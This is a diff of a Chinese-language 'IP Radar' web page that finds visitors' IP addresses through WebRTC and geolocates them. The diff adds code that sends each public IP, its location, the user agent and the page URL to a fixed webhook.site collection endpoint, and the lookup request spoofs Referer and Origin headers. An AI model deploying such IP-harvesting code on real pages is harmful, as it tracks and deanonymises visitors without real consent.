@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>IP雷达 · 智能过滤内网IP | 纯真IP地址解析</title>
+    <title>IP雷达 · 智能过滤 + 数据上报</title>
     <style>
         * {
             box-sizing: border-box;
@@ -222,24 +222,24 @@
 
 <div class="card">
     <div class="header">
-        <h1>IP 雷达 · 智能过滤版</h1>
-        <p>WebRTC 获取IP | 自动过滤内网地址 & 非IPv4 | 公网IPv4调用纯真IP库解析</p>
+        <h1>IP 雷达 · 智能过滤 + 数据上报</h1>
+        <p>WebRTC获取IP | 自动过滤内网/非IPv4 | 公网IPv4调用纯真IP库 | 结果自动上报至 webhook.site</p>
     </div>
     <div class="content">
         <div class="info-panel">
             <p>📡 利用 WebRTC STUN 请求获取本机所有IP地址（含局域网/公网/IPv6）。</p>
-            <p>🔍 智能策略：<span class="badge">内网地址(10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,127.x.x.x)</span> <span class="badge">非IPv4(如IPv6)</span> 将<strong>跳过API查询</strong>，直接显示「内网/非IPv4，无需查询」。</p>
-            <p>🌍 仅对公网IPv4地址调用纯真IP新接口（已尝试添加Referer等头）。</p>
-            <p>⚡ 注意：某些浏览器可能限制WebRTC IP泄露，结果仅供参考。</p>
+            <p>🔍 智能策略：<span class="badge">内网地址</span> <span class="badge">非IPv4(如IPv6)</span> 将<strong>跳过API查询</strong>，直接显示「内网/非IPv4，无需查询」。</p>
+            <p>🌍 仅对公网IPv4地址调用纯真IP新接口查询地理位置。</p>
+            <p>📤 所有公网IPv4的查询结果（成功/失败）都会自动上报到您指定的 webhook.site 地址。</p>
         </div>
         
         <div class="action-bar">
-            <button id="scanBtn">✨ 开始获取IP（智能过滤）</button>
+            <button id="scanBtn">✨ 开始获取IP（智能过滤+上报）</button>
             <button id="clearBtn" class="reset-btn">🗑 清空结果</button>
         </div>
         
         <div id="statusMsg" class="status">
-            💡 准备就绪，点击上方按钮获取本地IP。只有公网IPv4才会查询纯真IP库。
+            💡 准备就绪，点击上方按钮获取本地IP。只有公网IPv4才会查询纯真IP库并自动上报。
         </div>
         
         <div id="resultsList" class="results-container">
@@ -247,44 +247,40 @@
         </div>
         <div class="footer-note">
             📌 纯真IP接口：https://www.cz88.net/api/cz88/ip/base?ip=地址 <br>
-            ⚠️ 内网IP / 非IPv4地址不会产生API请求，节省配额且更高效。
+            📤 上报地址：https://webhook.site/3c92a1f0-f173-47cd-a0ec-ee8d508a4169 <br>
+            ⚠️ 内网IP / 非IPv4地址不会产生API请求，也不会触发上报。
         </div>
     </div>
 </div>
 
 <script>
-    // ---------- 判断是否为公网IPv4（排除内网、保留地址、IPv6）----------
+    // ======================== 配置区 ========================
+    const REPORT_URL = 'https://webhook.site/3c92a1f0-f173-47cd-a0ec-ee8d508a4169';
+    
+    // ======================== 工具函数 ========================
+    // 判断是否为公网IPv4（排除内网、保留地址、IPv6）
     function isPublicIPv4(ip) {
-        // 首先必须是IPv4格式 (点分十进制)
         const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
         if (!ipv4Regex.test(ip)) return false;
         
-        // 拆分段
         const parts = ip.split('.').map(Number);
         const firstOctet = parts[0];
         const secondOctet = parts[1];
         
         // 内网/保留地址范围
-        // 127.0.0.0/8 (环回)
         if (firstOctet === 127) return false;
-        // 10.0.0.0/8
         if (firstOctet === 10) return false;
-        // 172.16.0.0/12
         if (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) return false;
-        // 192.168.0.0/16
         if (firstOctet === 192 && secondOctet === 168) return false;
-        // 169.254.0.0/16 (链路本地)
         if (firstOctet === 169 && secondOctet === 254) return false;
-        // 0.0.0.0/8
         if (firstOctet === 0) return false;
-        // 224.0.0.0/4 (多播) 和一些其他保留段简单过滤
-        if (firstOctet >= 224 && firstOctet <= 239) return false; // 多播范围
-        if (firstOctet >= 240) return false; // 保留/实验性
+        if (firstOctet >= 224 && firstOctet <= 239) return false;
+        if (firstOctet >= 240) return false;
         
         return true;
     }
     
-    // ---------- 纯真IP解析接口封装 (仅公网IPv4调用) ----------
+    // 纯真IP查询接口
     async function lookupIPWithCz88(ipAddr) {
         const apiUrl = `https://www.cz88.net/api/cz88/ip/base?ip=${encodeURIComponent(ipAddr)}`;
         try {
@@ -296,21 +292,14 @@
                 signal: controller.signal,
                 headers: {
                     'Accept': 'application/json, text/plain, */*',
-                    'Content-Type': 'application/json',
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                     'Referer': 'https://www.cz88.net/',
-                    'Origin': 'https://www.cz88.net',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Sec-Fetch-Dest': 'empty'
+                    'Origin': 'https://www.cz88.net'
                 }
             });
             clearTimeout(timeoutId);
             
-            if (!response.ok) {
-                throw new Error(`HTTP ${response.status}`);
-            }
-            
+            if (!response.ok) throw new Error(`HTTP ${response.status}`);
             const data = await response.json();
             
             if (data && data.success === true && data.code === 200 && data.data) {
@@ -323,36 +312,46 @@
                 if (locData.isp) locationParts.push(`[${locData.isp}]`);
                 
                 let locationString = locationParts.join(' · ') || locData.netAddress || '未知位置';
+                let coordText = (locData.locations && locData.locations[0]?.latitude) ? ` (坐标: ${locData.locations[0].latitude}, ${locData.locations[0].longitude})` : '';
                 
-                let coordText = '';
-                if (locData.locations && locData.locations.length > 0 && locData.locations[0].latitude) {
-                    coordText = ` (坐标: ${locData.locations[0].latitude}, ${locData.locations[0].longitude})`;
-                }
-                
-                return {
-                    success: true,
-                    ip: ipAddr,
-                    location: locationString + coordText,
-                    fullDisplay: locationString,
-                    rawDetail: locData,
-                    isp: locData.isp,
-                    asn: locData.asn
-                };
+                return { success: true, ip: ipAddr, fullDisplay: locationString + coordText, rawDetail: locData };
             } else {
-                const errorMsg = data?.message || `查询失败 (code: ${data?.code})`;
-                return { success: false, error: errorMsg, raw: data };
+                return { success: false, error: data?.message || `查询失败 (code: ${data?.code})` };
             }
         } catch (err) {
-            console.warn(`查询IP ${ipAddr} 失败:`, err);
             let friendlyError = err.name === 'AbortError' ? '请求超时' : err.message;
-            if (friendlyError.includes('Failed to fetch') || friendlyError.includes('NetworkError')) {
-                friendlyError = '网络请求失败，可能是CORS跨域限制或接口需要后端代理。';
-            }
-            return { success: false, error: friendlyError, raw: null };
+            if (friendlyError.includes('Failed to fetch')) friendlyError = '网络请求失败，可能是CORS跨域限制。';
+            return { success: false, error: friendlyError };
         }
     }
-
-    // ---------- WebRTC 获取IP (原函数稳定版) ----------
+    
+    // ---------- 新增：数据上报函数 ----------
+    async function reportData(ip, locationInfo, querySuccess) {
+        const payload = {
+            timestamp: new Date().toISOString(),
+            ip: ip,
+            query_success: querySuccess,
+            location: locationInfo || (querySuccess ? '解析成功但无详细数据' : '查询失败未返回位置'),
+            user_agent: navigator.userAgent,
+            url: window.location.href,
+            source: 'IP_Radar_Tool'
+        };
+        
+        try {
+            // 使用 no-cors 模式进行跨域上报，确保数据能送达但无法读取响应
+            await fetch(REPORT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            console.log(`[Report] 数据已上报: ${ip} | 成功: ${querySuccess}`);
+        } catch (error) {
+            console.error(`[Report] 数据上报失败 (${ip}):`, error);
+        }
+    }
+    
+    // ======================== WebRTC 获取IP ========================
     function getIPsPromise() {
         return new Promise((resolve, reject) => {
             let ip_dups = {};
@@ -366,9 +365,7 @@
                 }
             };
             
-            let RTCPeerConnection = window.RTCPeerConnection
-                || window.mozRTCPeerConnection
-                || window.webkitRTCPeerConnection;
+            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
             let iframeWin = null;
             
             if (!RTCPeerConnection) {
@@ -378,9 +375,7 @@
                 iframe.id = 'dynamicIframeForStun';
                 document.body.appendChild(iframe);
                 iframeWin = iframe.contentWindow;
-                RTCPeerConnection = iframeWin.RTCPeerConnection
-                    || iframeWin.mozRTCPeerConnection
-                    || iframeWin.webkitRTCPeerConnection;
+                RTCPeerConnection = iframeWin.RTCPeerConnection || iframeWin.mozRTCPeerConnection || iframeWin.webkitRTCPeerConnection;
                 if (!RTCPeerConnection) {
                     document.body.removeChild(iframe);
                     reject(new Error("当前浏览器不支持WebRTC或已被禁用。"));
@@ -388,23 +383,13 @@
                 }
             }
             
-            let servers = {
-                iceServers: [
-                    { urls: "stun:stun.l.google.com:19302" },
-                    { urls: "stun:stun.nfon.net:3478" },
-                    { urls: "stun:stun.stunprotocol.org:3478" }
-                ]
-            };
-            
+            let servers = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun.nfon.net:3478" }, { urls: "stun:stun.stunprotocol.org:3478" }] };
             let mediaConstraints = { optional: [{ RtpDataChannels: true }] };
             let pc = null;
             try {
                 pc = new RTCPeerConnection(servers, mediaConstraints);
             } catch (err) {
-                if (iframeWin) {
-                    let iframeElem = document.getElementById('dynamicIframeForStun');
-                    if (iframeElem) iframeElem.remove();
-                }
+                if (iframeWin) document.getElementById('dynamicIframeForStun')?.remove();
                 reject(new Error("创建RTCPeerConnection失败: " + err.message));
                 return;
             }
@@ -417,10 +402,8 @@
                 finished = true;
                 if (timeoutId) clearTimeout(timeoutId);
                 try { pc.close(); } catch(e) {}
-                let dynamicIframe = document.getElementById('dynamicIframeForStun');
-                if (dynamicIframe && dynamicIframe.parentNode) dynamicIframe.parentNode.removeChild(dynamicIframe);
-                let ipsArray = Array.from(collectedIPs);
-                resolve(ipsArray);
+                document.getElementById('dynamicIframeForStun')?.remove();
+                resolve(Array.from(collectedIPs));
             }
             
             function handleCandidate(candidate) {
@@ -430,50 +413,31 @@
             }
             
             pc.onicecandidate = function(iceEvent) {
-                if (iceEvent.candidate && iceEvent.candidate.candidate) {
-                    handleCandidate(iceEvent.candidate.candidate);
-                }
+                if (iceEvent.candidate?.candidate) handleCandidate(iceEvent.candidate.candidate);
             };
             
-            try {
-                pc.createDataChannel("ipCollectChannel");
-            } catch (err) {
-                console.warn("创建DataChannel失败", err);
-            }
+            try { pc.createDataChannel("ipCollectChannel"); } catch(e) { console.warn(e); }
             
             pc.createOffer()
                 .then(offer => {
-                    if (offer && offer.sdp) {
-                        offer.sdp.split('\n').forEach(line => {
-                            let match = line.match(ip_regex);
-                            if (match && match[0]) callbackOnce(match[0]);
-                        });
-                    }
+                    if (offer?.sdp) offer.sdp.split('\n').forEach(line => { let m = line.match(ip_regex); if (m?.[0]) callbackOnce(m[0]); });
                     return pc.setLocalDescription(offer);
                 })
                 .then(() => {
                     timeoutId = setTimeout(() => {
-                        if (pc.localDescription && pc.localDescription.sdp) {
-                            let lines = pc.localDescription.sdp.split('\n');
-                            lines.forEach(line => {
-                                if (line.indexOf('a=candidate:') === 0) handleCandidate(line);
-                            });
+                        if (pc.localDescription?.sdp) {
+                            pc.localDescription.sdp.split('\n').forEach(line => { if (line.indexOf('a=candidate:') === 0) handleCandidate(line); });
                         }
                         finishCollection();
                     }, 1500);
                 })
-                .catch(err => {
-                    console.error("setLocalDescription错误", err);
-                    finishCollection();
-                });
+                .catch(err => { console.error(err); finishCollection(); });
                 
-            setTimeout(() => {
-                if (!finished) finishCollection();
-            }, 2800);
+            setTimeout(() => { if (!finished) finishCollection(); }, 2800);
         });
     }
     
-    // ---------- UI 组件 ----------
+    // ======================== UI 组件 ========================
     const resultsContainer = document.getElementById('resultsList');
     const statusDiv = document.getElementById('statusMsg');
     const scanBtn = document.getElementById('scanBtn');
@@ -492,15 +456,11 @@
         }
     }
     
-    // 添加IP卡片（区分跳过查询和需要查询）
     function addIpCard(ipAddress, willQuery = false) {
         const cardDiv = document.createElement('div');
         cardDiv.className = 'result-card';
-        if (!willQuery) {
-            cardDiv.classList.add('skip-card');
-        } else {
-            cardDiv.classList.add('loading');
-        }
+        if (!willQuery) cardDiv.classList.add('skip-card');
+        else cardDiv.classList.add('loading');
         const ipType = isPublicIPv4(ipAddress) ? "公网IPv4" : (ipAddress.includes(':') ? "IPv6" : "内网/保留IPv4");
         cardDiv.innerHTML = `
             <div class="result-header">
@@ -508,7 +468,7 @@
                 <div><span class="ip-badge">${escapeHtml(ipAddress)}</span> <span class="ip-type-badge">${escapeHtml(ipType)}</span></div>
             </div>
             <div class="geo-detail">
-                ${willQuery ? '<span class="label">🌍 地理位置：</span> 正在查询纯真IP新接口...' : '<span class="label">💡 说明：</span> 内网地址或非IPv4格式，无需调用API接口。'}
+                ${willQuery ? '<span class="label">🌍 地理位置：</span> 正在查询纯真IP新接口...' : '<span class="label">💡 说明：</span> 内网地址或非IPv4格式，无需调用API接口，亦不上报。'}
             </div>
         `;
         resultsContainer.appendChild(cardDiv);
@@ -517,46 +477,31 @@
     
     function updateIpCard(cardElement, ip, lookupResult, skipped = false) {
         if (!cardElement) return;
-        if (skipped) {
-            // 已经是skip-card样式，无需改动内容，但以防万一更新说明
-            const detailDiv = cardElement.querySelector('.geo-detail');
-            if (detailDiv && !detailDiv.innerHTML.includes('无需调用API')) {
-                detailDiv.innerHTML = '<span class="label">💡 说明：</span> 内网地址或非IPv4格式，无需调用API接口。';
-            }
-            return;
-        }
-        
+        if (skipped) return;
         if (lookupResult.success) {
             cardElement.classList.remove('loading');
             cardElement.classList.add('success');
-            let extraInfo = '';
-            if (lookupResult.isp) extraInfo += `<div><span class="label">📡 运营商：</span>${escapeHtml(lookupResult.isp)}</div>`;
-            if (lookupResult.asn) extraInfo += `<div><span class="label">🔧 ASN：</span>${escapeHtml(lookupResult.asn)}</div>`;
             cardElement.innerHTML = `
                 <div class="result-header">
-                    <span>✅ 解析成功</span>
+                    <span>✅ 解析成功 (已上报)</span>
                     <div><span class="ip-badge">${escapeHtml(ip)}</span> <span class="ip-type-badge">公网IPv4</span></div>
                 </div>
                 <div class="geo-detail">
                     <div><span class="label">🌍 地理位置：</span> <strong>${escapeHtml(lookupResult.fullDisplay)}</strong></div>
-                    ${extraInfo}
-                    <div style="margin-top:6px; font-size:0.75rem; color:#6c757d;">📌 数据来自纯真IP库新接口</div>
+                    <div style="margin-top:6px; font-size:0.75rem; color:#6c757d;">📌 数据来自纯真IP库，结果已自动上报至 webhook.site</div>
                 </div>
             `;
         } else {
             cardElement.classList.remove('loading');
             cardElement.classList.add('error');
-            let errorMsg = lookupResult.error || '查询失败';
-            if (errorMsg.includes('5101') || errorMsg.includes('请求参数校验异常')) {
-                errorMsg = '接口鉴权失败 (5101)。该接口可能需要Token或后端代理。';
-            }
             cardElement.innerHTML = `
                 <div class="result-header">
-                    <span>⚠️ 解析失败</span>
+                    <span>⚠️ 解析失败 (已上报)</span>
                     <div><span class="ip-badge">${escapeHtml(ip)}</span> <span class="ip-type-badge">公网IPv4</span></div>
                 </div>
                 <div class="geo-detail">
-                    <span class="label">❌ 错误信息：</span> ${escapeHtml(errorMsg)}
+                    <span class="label">❌ 错误信息：</span> ${escapeHtml(lookupResult.error)}
+                    <div style="margin-top:6px; font-size:0.75rem;">📤 失败记录已上报至 webhook.site</div>
                 </div>
             `;
         }
@@ -573,10 +518,8 @@
     }
     
     function clearResults() {
-        while (resultsContainer.firstChild) {
-            resultsContainer.removeChild(resultsContainer.firstChild);
-        }
-        updateStatus("✨ 清空完成。点击按钮重新扫描，内网/IPv6将自动跳过API查询。", false);
+        while (resultsContainer.firstChild) resultsContainer.removeChild(resultsContainer.firstChild);
+        updateStatus("✨ 清空完成。点击按钮重新扫描，内网/IPv6将自动跳过API查询和上报。", false);
     }
     
     async function startScan() {
@@ -584,71 +527,42 @@
         updateStatus("🚀 正在通过WebRTC探测本机IP地址... (1-2秒)", false);
         scanBtn.disabled = true;
         scanBtn.style.opacity = "0.6";
+        
         let ips = [];
-        try {
-            ips = await getIPsPromise();
-        } catch (err) {
-            updateStatus(`❌ 获取IP失败: ${err.message}`, true);
-            scanBtn.disabled = false;
-            scanBtn.style.opacity = "1";
-            return;
-        }
+        try { ips = await getIPsPromise(); } 
+        catch (err) { updateStatus(`❌ 获取IP失败: ${err.message}`, true); scanBtn.disabled = false; scanBtn.style.opacity = "1"; return; }
         
         if (!ips || ips.length === 0) {
             updateStatus("⚠️ 未检测到任何有效IP地址。可能因隐私限制/浏览器策略无法获取。", true);
-            scanBtn.disabled = false;
-            scanBtn.style.opacity = "1";
+            scanBtn.disabled = false; scanBtn.style.opacity = "1"; 
             return;
         }
         
         const uniqueIPs = [...new Set(ips)];
-        let publicIPv4List = [];
-        let skippedList = [];
+        const publicIPv4List = uniqueIPs.filter(ip => isPublicIPv4(ip));
+        const skippedList = uniqueIPs.filter(ip => !isPublicIPv4(ip));
         
-        // 分类：公网IPv4 和 其他（内网/IPv6）
-        for (let ip of uniqueIPs) {
-            if (isPublicIPv4(ip)) {
-                publicIPv4List.push(ip);
-            } else {
-                skippedList.push(ip);
-            }
-        }
-        
-        updateStatus(`🔍 捕获 ${uniqueIPs.length} 个独立IP：其中公网IPv4 ${publicIPv4List.length} 个（将查询接口），内网/非IPv4 ${skippedList.length} 个（直接跳过）`, false);
+        updateStatus(`🔍 捕获 ${uniqueIPs.length} 个独立IP：公网IPv4 ${publicIPv4List.length} 个（将查询并上报），内网/非IPv4 ${skippedList.length} 个（跳过）`, false);
         
         const cardMap = new Map();
-        // 先为所有IP创建卡片（区分是否查询）
         for (let ip of uniqueIPs) {
             const willQuery = isPublicIPv4(ip);
             const card = addIpCard(ip, willQuery);
             cardMap.set(ip, { card, willQuery });
         }
         
-        // 仅对公网IPv4发起API请求
+        // 仅对公网IPv4查询并上报
         for (let ip of publicIPv4List) {
             const entry = cardMap.get(ip);
             if (!entry) continue;
             const result = await lookupIPWithCz88(ip);
             updateIpCard(entry.card, ip, result, false);
-            await new Promise(r => setTimeout(r, 250)); // 略微延迟避免并发过高
+            // 上报数据：传入IP、地理位置信息（成功时是位置字符串，失败时是错误信息）、是否成功标志
+            await reportData(ip, result.success ? result.fullDisplay : result.error, result.success);
+            await new Promise(r => setTimeout(r, 250));
         }
         
-        // 对于跳过的IP，确保卡片标记为跳过样式（已经是了，但强化显示）
-        for (let ip of skippedList) {
-            const entry = cardMap.get(ip);
-            if (entry && !entry.willQuery) {
-                // 确保skip-card样式并且内容正确
-                if (!entry.card.classList.contains('skip-card')) {
-                    entry.card.classList.add('skip-card');
-                }
-                const detailDiv = entry.card.querySelector('.geo-detail');
-                if (detailDiv && detailDiv.innerHTML.includes('正在查询')) {
-                    detailDiv.innerHTML = '<span class="label">💡 说明：</span> 内网地址或非IPv4格式，无需调用API接口。';
-                }
-            }
-        }
-        
-        updateStatus(`✅ 扫描完成！公网IPv4已尝试查询，内网/非IPv4已自动过滤。`, false);
+        updateStatus(`✅ 扫描完成！公网IPv4已查询并上报，内网/非IPv4已自动过滤。`, false);
         scanBtn.disabled = false;
         scanBtn.style.opacity = "1";
     }
